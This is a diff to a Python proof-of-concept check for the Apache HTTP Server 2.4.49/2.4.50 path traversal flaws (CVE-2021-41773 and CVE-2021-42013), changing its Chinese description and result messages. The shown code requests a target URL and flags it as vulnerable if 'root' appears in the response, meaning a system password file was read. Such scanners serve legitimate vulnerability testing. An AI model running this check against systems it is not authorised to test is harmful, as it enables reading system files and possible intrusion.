@@ -19,10 +19,7 @@ class POC(pocs.Pocs):
         self.app_name='Apache HTTP Server'
         self.app_version='2.4.49 2.4.50'
         self.author='haochen'
-        self.msg='''Apache HTTP Server 2.4.50 中对 CVE-2021-41773 的修复不够充分。攻击者可以使⽤路径
-遍历攻击将 URL 映射到由类似别名的指令配置的⽬录之外的⽂件。如果这些⽬录之外的⽂
-件不受通常的默认配置 “要求全部拒绝” 的保护，则这些请求可能会成功。如果还为这些别
-名路径启⽤了 CGI 脚本，则可以允许远程代码执⾏。'''
+        self.msg='''攻击者可以使⽤路径遍历攻击将 URL 映射到由类似别名的指令配置的⽬录之外的⽂件。'''
         self.must_parameter={
             'target' : ''
         }
@@ -61,10 +58,10 @@ class POC(pocs.Pocs):
             request = urllib.request.Request(url=url,headers=head)
             response = urllib.request.urlopen(request,context=context)
             if 'root' in response.read().decode('utf-8'):
-                msg = '存在CVE-2021-41773任意文件读取漏洞 ' + url
+                msg = '存在CVE-2021-42013路径穿越漏洞 ' + url
                 return msg
             else:
-                return '不存在CVE-2021-41773任意文件读取漏洞' + url
+                return '不存在CVE-2021-42013路径穿越漏洞' + url
         except:
             return 'error! 目标网站无法正常访问！'
 
